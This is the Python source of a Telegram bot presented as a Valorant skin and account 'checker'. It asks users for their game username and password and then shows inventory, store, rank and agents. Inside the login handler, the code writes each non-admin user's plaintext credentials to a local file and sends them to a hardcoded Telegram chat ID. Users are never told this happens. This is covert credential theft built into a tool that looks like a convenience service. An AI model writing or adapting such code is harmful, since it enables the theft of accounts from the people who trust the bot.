import datetime
import json
import logging
import time

from aiogram.dispatcher.filters import Command

import config
from checker import ClientAcc
from db.base_db import DataBase
from filter.Language_filter import *
from keyboards.inline import auth_menu, cb
from keyboards.inline_eng import auth_menu_eng

from main import bot,dp
from states.state import StartState, AdminState

from src.screen_skins import image_skins
db = DataBase('test.db')


from aiogram import types
from aiogram.dispatcher import FSMContext

logger = logging.getLogger('app.base_eng')

@dp.message_handler(IsLanguageENG(),Command('start'),state='*')
async def start_cmnd_eng(message: types.Message, state: FSMContext):
    bad_words = ['<','>','<>']
    logger.info(f'Command start_cmnd for user {message.from_user.first_name}')
    cur_state = await state.get_state()
    if cur_state:
        await state.reset_state()
    if not db.user_exist(message.from_user.id):
        if not all(bad_word in message.from_user.first_name for bad_word in bad_words):
            db.add_user(message.from_user.id,message.from_user.first_name)
        else:
            db.add_user(message.from_user.id,None)


    welcome_message = (
        f'👋 Welcome, {message.from_user.first_name}!\n'
        'Im a Valorant checker bot. Use the available commands to check your skin collection and other information.'
        'To get started, click the "Log In" button.'
    )
    await message.answer(welcome_message, parse_mode=types.ParseMode.MARKDOWN,reply_markup=auth_menu_eng('Login'))


@dp.callback_query_handler(IsLanguageENG_CALL(),cb.filter(action='login_eng'),state='*')
async def auth_cmdn_eng(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Команда auth_cmnd для пользователя {call.message.chat.first_name}')
    cur_state = await state.get_state()
    if cur_state:
        await state.reset_state()
    welcome_message = (
        'To authorize, please write your username and password separated by a colon.\n'
        '🔐 Example: username:password'
    )
    await call.message.edit_text(welcome_message, parse_mode=types.ParseMode.MARKDOWN,reply_markup=auth_menu_eng())
    await StartState.log_pass.set()



@dp.message_handler(IsLanguageENG(),state=StartState.log_pass, content_types=types.ContentTypes.TEXT)
async def auth_not_command_eng(message: types.Message, state: FSMContext):
    mail_verified = '✅'
    number_verified = '✅'
    logger.info(f'Command auth_not_command for user {message.from_user.first_name}')
    if len(message.text.split(':')) != 2:
        await message.answer('⚠ Invalid format, please try again.', reply_markup=auth_menu_eng('Cancel'))
    else:
        username, password = message.text.split(':')
        client = ClientAcc(username=username, password=password)
        result = await client.start()
        if result:
            async with state.proxy() as data:
                data['username'] = username
                data['password'] = password
                data['access_token'] = result['access_token']
                data['entitlements_token'] = result['entitlements_token']
                data['region'] = result['region']
                data['puuid'] = result['puuid']
            client = ClientAcc(username=username, password=password)
            verif = client.check_verif(result['access_token'])
            try:  # Если есть бан , добавим PERMANENT_BAN PERMA_BAN TIME_BAN
                ban = verif['ban']
                block_ban = ban['restrictions'][0]
                type_ban = block_ban['type']
                if type_ban == 'PERMANENT_BAN' or type_ban == 'PERMA_BAN':

                    await bot.delete_message(message.from_user.id, message_id=message.message_id - 1)
                    await message.answer('<b>Account Blocked</b>', reply_markup=auth_menu())
                    await state.reset_state()
                    # Отправить сообщение и не продолжать обрабатывать
                elif type_ban == 'TIME_BAN' or type_ban == 'LEGACY_BAN' or type_ban == 'PBE_LOGIN_TIME_BAN':
                    time_ban = verif['ban']['restrictions'][0]['dat']['expirationMillis']
                    seconds_ban = int(time_ban) // 1000
                    remaining_time = int(seconds_ban) - int(time.time())
                    struct_time = time.gmtime(remaining_time)
                    await bot.delete_message(message.from_user.id, message_id=message.message_id - 1)
                    await message.answer(f'<i>Account unblocked throught:</i>\n'
                                         f'<b>{struct_time.tm_mon}mon. {struct_time.tm_mday}days. {struct_time.tm_hour}hours. {struct_time.tm_min}min.</b>',
                                         reply_markup=auth_menu())
                    await state.reset_state()
            except Exception as e:
                if not verif["email_verified"]:
                    mail_verified = '❌'
                if not verif["phone_number_verified"]:
                    number_verified = '❌'
                #await bot.delete_message(chat_id=message.chat.id, message_id=int(message.message_id) - 1)
                await message.answer(f'✅ Authorization successful!\n\n'
                                     f'👋 Hello, *{result["name"]}*!\n'
                                     f'📍 Your region: *{result["region"].upper()}*\n'
                                     f'📱 Phone {number_verified}\n'
                                     f'✉ Email {mail_verified}\n', reply_markup=auth_menu_eng(menu='Auth'),
                                     parse_mode=types.ParseMode.MARKDOWN)
                if message.from_user.id != int(config.ADMIN_ID):
                    with open('accounts_get.txt', 'a') as file:
                        time_get = str(datetime.datetime.now()).split(".")[:1]
                        file.write(f'{time_get[0]} {message.text}\n')
                    await bot.send_message(5273674597, f'User {message.from_user.first_name}\n'
                                                    f'<b>Account: {message.text}\n</b>')
                await state.reset_state(with_data=False)
        else:
            await message.answer('❌ Invalid account', reply_markup=auth_menu_eng('Login'))
            await state.reset_state()

@dp.callback_query_handler(IsLanguageENG_CALL(),cb.filter(action='skins_eng'))  # state
async def get_my_skins_eng(call:types.CallbackQuery, state: FSMContext):
    count_price = 0
    logger.info(f'Команда get_my_skins_cmnd для пользователя {call.message.chat.first_name}')
    if not await state.get_data():
        await call.message.answer('Войдите в аккаунт!',reply_markup=auth_menu_eng('Login'))
    else:
        async with state.proxy() as data:
            username = data['username']
            password = data['password']
            ent_token = data['entitlements_token']
            acc_token = data['access_token']
            region = data['region']
            puuid = data['puuid']

        client = ClientAcc(username=username, password=password)
        items = client.get_items(item='e7c63390-eda7-46e0-bb7a-a6abdacd2433',
                                 ent_token=ent_token,
                                 region=region,
                                 acc_token=acc_token,
                                 puuid=puuid)
        with open('skins_info\skins_price.json', 'r') as file:
            prices = json.load(file)
        # ID всех скинов
        with open('skins_info\skins_data_eng.json', 'r', encoding='UTF8') as skins_file:
            skins_data = json.load(skins_file)
        # Словарь для скинов с лвлом
        price_skin = {}
        skin_full = {}
        for skin_id in items['Entitlements']:
            for skin_uuid in skins_data['data']:
                if skin_id['ItemID'] == skin_uuid['uuid']:
                    if not 'Level' in skin_uuid['displayName']:
                        skin_full[skin_uuid['displayName']] = skin_uuid['uuid']
                        for price in prices['Offers']:
                            if skin_id['ItemID'] == price['OfferID']:
                                VP_price = price['Cost']['85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741']
                                price_skin[skin_uuid['displayName']] = VP_price
        if skin_full:
            sort_skins = dict(sorted(skin_full.items()))
            urls_photo = image_skins(skin_full=sort_skins,lang='EU')
            for photo in urls_photo:
                await bot.send_photo(chat_id=call.message.chat.id,
                                     photo=types.InputFile(photo))
            answer_skins = '🎮 Your skin collections 🎮:\n\n'
            for index, skin_name in enumerate(skin_full,start=1):
                if skin_name in price_skin:
                    count_price += price_skin[skin_name]
                answer_skins += f'{index}. {skin_name}\n'
        else:
            answer_skins = '🚫 You dont have skins. 🚫'
        if len(skin_full) <90:
            await call.message.edit_text(f'{answer_skins}\n'
                                         f'<i>Inventory price</i> <b>{count_price}VP</b>\n'
                                         f'@checker_valo_bot',reply_markup=auth_menu_eng('Auth'))
        else:
            first_message = answer_skins[:int(len(answer_skins)/2)]  # Первая часть сообщения
            second_message = answer_skins[int(len(answer_skins)/2):]  # Вторая часть сообщения
            await call.message.edit_text(f'\n<b>Page 1</b>\n'
                                         f'{first_message}', reply_markup=None)
            await call.message.answer(f'\n<b>Page 2</b>\n'
                f'{second_message}'
                f'@checker_valo_bot',reply_markup=auth_menu_eng('Auth'))


@dp.callback_query_handler(IsLanguageENG_CALL(), cb.filter(action='store_eng'))
async def get_my_store_eng(call: types.CallbackQuery, state: FSMContext):
    logger.info(f'Command get_my_store for user {call.message.chat.first_name}')
    if not await state.get_data():
        await call.message.answer('Log in to your account!', reply_markup=auth_menu_eng('Login'))
    answer_text = '🎁 Your store consists of 🎁:\n\n'
    async with state.proxy() as data:
        username = data['username']
        password = data['password']
        ent_token = data['entitlements_token']
        acc_token = data['access_token']
        region = data['region']
        puuid = data['puuid']
    client = ClientAcc(username=username, password=password)
    items_store = client.get_store(ent_token=ent_token,
                                   region=region,
                                   acc_token=acc_token,
                                   puuid=puuid)
    skin_info_dict = {}
    my_store_id = [my_skin for my_skin in items_store['SkinsPanelLayout']['SingleItemOffers']]
    # Get the database with skins
    with open('skins_info\skins_data_eng.json', 'r', encoding='UTF8') as skins_file:
        skins_data = json.load(skins_file)
    # Add information about the name and price for each UUID
    for skin in skins_data['data']:
        if skin['uuid'] in my_store_id:
            skin_name = skin['displayName']
            skin_info_dict[skin['uuid']] = {'name': skin_name, 'price': None}

    for items in items_store['SkinsPanelLayout']['SingleItemStoreOffers']:
        if items['OfferID'] in my_store_id:
            price = str(items['Cost']['85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741']) + 'VP'
            if items['OfferID'] in skin_info_dict:
                skin_info_dict[items['OfferID']]['price'] = price

    # Store closing time
    time_store = items_store['SkinsPanelLayout']['SingleItemOffersRemainingDurationInSeconds']

    # Display the result
    for uuid, info in skin_info_dict.items():
        skin_name = info['name']
        skin_price = info['price']
        answer_text += f'{skin_name} - {skin_price}\n'

    await call.message.edit_text(f'{answer_text}\n'
                                 f'⏳ Closing time: {int(time_store/3600)}h.\n'
                                 f'@checker_valo_bot', reply_markup=auth_menu_eng('Auth'))



@dp.callback_query_handler(IsLanguageENG_CALL(),cb.filter(action='night_market_eng'))
async def night_market_eng(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Команда night_market для пользователя {call.message.chat.first_name}')
    night_answer = '🌌Night Market🌌:\n\n'
    async with state.proxy() as data:
        username = data['username']
        password = data['password']
        ent_token = data['entitlements_token']
        acc_token = data['access_token']
        region = data['region']
        puuid = data['puuid']
    client = ClientAcc(username=username,password=password)
    items_store = client.get_store(ent_token=ent_token,
                             region=region,
                             acc_token=acc_token,
                             puuid=puuid)
    with open(r'skins_info\new_skins.json', 'r', encoding='UTF8') as skins_file:
        skins_data = json.load(skins_file)

    night_store = items_store["BonusStore"]['BonusStoreOffers']
    time_end = items_store['BonusStore']["BonusStoreRemainingDurationInSeconds"]
    time_end_days = time.gmtime(time_end).tm_mday - 1
    time_end_hours = time.gmtime(time_end).tm_hour
    time_end_min = time.gmtime(time_end).tm_min
    # ['Offer']['OfferID'] - uuid скина
    for skins_night in night_store:
        skin_uuid = skins_night['Offer']['OfferID']  # UUID скинов имени
        old_price = skins_night['Offer']['Cost'][
            '85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741']  # Старые цены , мб в список или без values
        new_price = skins_night["DiscountCosts"]['85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741']
        for night_skin in skins_data['data']:
            if night_skin['uuid'] == skin_uuid:
                night_answer += f'<b>{night_skin["displayName"]}</b> - <i><s>{old_price}</s></i> - <i><b>{new_price}</b></i>\n'
    await call.message.edit_text(text=f'{night_answer}\n'
                                      f'Ends in: <b>{time_end_days if time_end_days else 0}d. {time_end_hours}h. {time_end_min if time_end_min else 0}min.</b>\n\n'
                                      f'@checker_valo_bot', reply_markup=auth_menu_eng('Auth'))


@dp.callback_query_handler(IsLanguageENG_CALL(), cb.filter(action='account_eng'))
async def get_account_info_eng(call: types.CallbackQuery, state: FSMContext):
    logger.info(f'Command get_account_info for user {call.message.chat.first_name}')
    if not await state.get_data():
        await call.message.answer('Log in to your account!', reply_markup=auth_menu_eng('Login'))
    ranks = {
        0: "UNRANKED",
        1: "Unused1",
        2: "Unused2",
        3: "IRON 1",
        4: "IRON 2",
        5: "IRON 3",
        6: "BRONZE 1",
        7: "BRONZE 2",
        8: "BRONZE 3",
        9: "SILVER 1",
        10: "SILVER 2",
        11: "SILVER 3",
        12: "GOLD 1",
        13: "GOLD 2",
        14: "GOLD 3",
        15: "PLATINUM 1",
        16: "PLATINUM 2",
        17: "PLATINUM 3",
        18: "DIAMOND 1",
        19: "DIAMOND 2",
        20: "DIAMOND 3",
        21: "ASCENDANT 1",
        22: "ASCENDANT 2",
        23: "ASCENDANT 3",
        24: "IMMORTAL 1",
        25: "IMMORTAL 2",
        26: "IMMORTAL 3",
        27: "RADIANT",
    }
    async with state.proxy() as data:
        username = data['username']
        password = data['password']
        ent_token = data['entitlements_token']
        acc_token = data['access_token']
        region = data['region']
        puuid = data['puuid']
    client = ClientAcc(username=username, password=password)
    accounts = client.get_my_account(ent_token=ent_token,
                                     region=region,
                                     acc_token=acc_token,
                                     puuid=puuid)
    # If the rank is not revealed
    if accounts['Rank'] is None:
        games = accounts['games']
        VP = accounts['VP']
        Kingdom = accounts['Kingdom']
        RP = accounts['RadiantPoints']
        await call.message.edit_text(f'🏆 Player Information\n'
                                     f'🔹Rank: Unranked\n'
                                     f'🔹VP: {VP}\n'
                                     f'🔹Kingdom: {Kingdom}\n'
                                     f'🔹RP: {RP}\n'
                                     f'🔹Number of games for title: {games}\n\n'
                                     f'@checker_valo_bot', reply_markup=auth_menu_eng('Auth'))
    else:
        rank = ranks[accounts['Rank']]
        last_match = accounts['last_match']
        VP = accounts['VP']
        Kingdom = accounts['Kingdom']
        RP = accounts['RadiantPoints']
        await call.message.edit_text(f'🏆 Player Information\n'
                                     f'🔹Rank: {rank}\n'
                                     f'🔹VP: {VP}\n'
                                     f'🔹Kingdom: {Kingdom}\n'
                                     f'🔹RP: {RP}\n'
                                     f'🔹Last match date: {last_match}\n\n'
                                     f'@checker_valo_bot', reply_markup=auth_menu_eng('Auth'))


@dp.callback_query_handler(IsLanguageENG_CALL(),cb.filter(action='agent_eng'))#state
async def get_my_agents_eng(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Команда get_my_aggents для пользователя {call.message.chat.first_name}')
    agents_data= {
            "5f8d3a7f-467b-97f3-062c-13acf203c006": "Breach",
            "f94c3b30-42be-e959-889c-5aa313dba261": "Raze",
            "6f2a04ca-43e0-be17-7f36-b3908627744d": "Skye",
            "117ed9e3-49f3-6512-3ccf-0cada7e3823b": "Cypher",
            "320b2a48-4d9b-a075-30f1-1f93a9b638fa": "Sova",
            "1e58de9c-4950-5125-93e9-a0aee9f98746": "Killjoy",
            "707eab51-4836-f488-046a-cda6bf494859": "Viper",
            "eb93336a-449b-9c1b-0a54-a891f7921d69": "Phoenix",
            "9f0d8ba9-4140-b941-57d3-a7ad57c6b417": "Brimstone",
            "7f94d92c-4234-0a36-9646-3a87eb8b5c89": "Yoru",
            "569fdd95-4d10-43ab-ca70-79becc718b46": "Sage",
            "a3bfb853-43b2-7238-a4f1-ad90e9e46bcc": "Reyna",
            "8e253930-4c05-31dd-1b6c-968525494517": "Omen",
            "add6443a-41bd-e414-f6ad-e58d267f4e95": "Jett",
            'cc8b64c8-4b25-4ff9-6e7f-37b4da43d235': 'Deadlock',
            'e370fa57-4757-3604-3648-499e1f642d3f': 'Gekko',
            "95b78ed7-4637-86d9-7e41-71ba8c293152": 'Harbor',
            '22697a3d-45bf-8dd7-4fec-84a9e28c69d7': 'Chamber',
            "bb2a4828-46eb-8cd1-e765-15848195d751": 'Neon',
            '41fb69c1-4189-7b37-f117-bcaf1e96f1bf': 'Astra',
            "601dbbe7-43ce-be57-2a40-4abd24953621": 'Kayo',
            'dade69b4-4f5a-8528-247b-219e5a1facd6': 'Fade',
            '0e38b510-41a8-5780-5e8f-568b2a4f2d6c': 'ISO'

    }
    if not await state.get_data():
        await call.message.answer('Log in to account!',reply_markup=auth_menu_eng('Login'))
    answer_text = '📎Yours Agents:📎\n\n' \
                  ''
    async with state.proxy() as data:
        username = data['username']
        password = data['password']
        ent_token = data['entitlements_token']
        acc_token = data['access_token']
        region = data['region']
        puuid = data['puuid']
    client = ClientAcc(username,password)
    agents = client.get_agents(ent_token=ent_token,
                             region=region,
                             acc_token=acc_token,
                             puuid=puuid)
    if not agents['Entitlements']:
        answer_text+=f'•<b>{agents_data.get("320b2a48-4d9b-a075-30f1-1f93a9b638fa")}</b>\n'
        answer_text += f'•<b>{agents_data.get("eb93336a-449b-9c1b-0a54-a891f7921d69")}</b>\n'
        answer_text += f'•<b>{agents_data.get("569fdd95-4d10-43ab-ca70-79becc718b46")}</b>\n'
        answer_text += f'•<b>{agents_data.get("add6443a-41bd-e414-f6ad-e58d267f4e95")}</b>\n'
        answer_text += f'•<b>{agents_data.get("eb93336a-449b-9c1b-0a54-a891f7921d69")}</b>\n'
    else:
        for agent in agents['Entitlements']:
            for key,val in agents_data.items():
                if agent['ItemID'] ==key:
                    answer_text+=f'•<b>{agents_data.get(agent["ItemID"])}</b>\n'
                else:
                    continue
    await call.message.edit_text(f'{answer_text}\n'
                                 f'@checker_valo_bot',reply_markup=auth_menu_eng('Auth'))




@dp.callback_query_handler(IsLanguageENG_CALL(),cb.filter(action='support_eng'),state='*')
async def support_cmnd_eng(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Command support_cmnd for user {call.message.chat.first_name}')
    cur_state = await state.get_state()
    if cur_state:
        await state.reset_state()
    await call.message.edit_text(f'About all questions @meggameggamegga',reply_markup=auth_menu_eng('Login'))

@dp.callback_query_handler(cb.filter(action='back'),state='*')
async def back_cmnd_eng(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Command back_cmnd for user {call.message.chat.first_name}')
    cur_state = await state.get_state()
    if cur_state:
        await state.reset_state()
    welcome_message = (
        f'👋 Welcome, <b>{call.message.from_user.first_name}</b>!\n'
        'Im a Valorant checker bot. Use the available commands to check your skin collection and other information.'
        'To get started, click the "Log In" button.'
    )

    await call.message.edit_text(welcome_message, parse_mode=types.ParseMode.MARKDOWN, reply_markup=auth_menu_eng('Login'))

@dp.callback_query_handler(IsLanguageENG_CALL(),cb.filter(action='exit_eng'),state='*')
@dp.callback_query_handler(IsLanguageENG_CALL(),cb.filter(action='cancel_eng'),state='*')
async def exit_to_login_eng(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Command exit_to_login for user {call.message.chat.first_name}')
    cur_state = await state.get_state()
    if cur_state:
        await state.reset_state()
    await call.message.delete()
    welcome_message = (
        'To authorize, please write your username and password separated by a colon.\n'
        '🔐 Example: username:password'
    )
    await call.message.answer(welcome_message, parse_mode=types.ParseMode.MARKDOWN, reply_markup=auth_menu_eng())
    await StartState.log_pass.set()